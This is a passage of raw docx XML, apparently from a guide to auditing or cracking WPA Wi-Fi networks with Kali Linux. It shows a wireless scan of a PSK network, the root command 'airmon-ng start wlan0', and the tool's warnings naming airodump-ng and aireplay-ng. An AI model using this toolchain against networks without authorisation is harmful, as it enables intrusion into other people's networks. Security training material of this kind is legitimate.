          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1100" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">36 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">48 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">54 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="1340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Mode:Master</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:t</w:t>
      </w:r>
      <w:r>
        <w:t>sf=00000000425b0a37</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> L</w:t>
      </w:r>
      <w:r>
        <w:t>ast</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>beacon:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>548</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s ago</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1340"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t>roup C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>KIP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1566" w:right="4115" w:firstLine="14"/>
      </w:pPr>
      <w:r>
        <w:t>Pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rw</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>se C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phers (2) :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>MP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>KIP Au</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on Su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(1) :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> P</w:t>
      </w:r>
      <w:r>
        <w:t>SK</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="140"/>
      </w:pPr>
      <w:hyperlink r:id="rId55">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rmon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>g start w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>an0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="140"/>
      </w:pPr>
      <w:r>
        <w:t>Found 2 proce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cause </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>roub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="140" w:right="3176"/>
      </w:pPr>
      <w:r>
        <w:t>If a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rodu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>ng, a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ay-ng or a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>un-ng s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ops </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>ork</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>af</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er a short</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>per</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tim</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">you </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ay want</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e of) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="260"/>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>D Na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="200"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>148 Ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>workManager</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="200"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">1324 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pa_supp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>cant</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12"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1885"/>
        <w:gridCol w:w="1465"/>
        <w:gridCol w:w="4910"/>
      </w:tblGrid>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="358"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1885" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>P</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">HY  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="51"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>In</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>er</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:t>ace</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1465" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="283"/>
            </w:pPr>
            <w:r>
              <w:t>Dr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>ver</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4910" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="236"/>
            </w:pPr>
            <w:r>
              <w:t>Ch</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>pset</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="358"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1885" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="40"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">phy0  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="50"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>w</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>an0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1465" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="283"/>
            </w:pPr>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>h9k_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>h</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4910" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="236"/>
            </w:pPr>
            <w:r>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>heros Co</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>mm</w:t>
            </w:r>
            <w:r>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>ti</w:t>
            </w:r>
            <w:r>
              <w:t>ons, Inc.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-12"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:t>R9271 802.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-10"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:t>1n</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="140" w:right="1452"/>
      </w:pPr>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
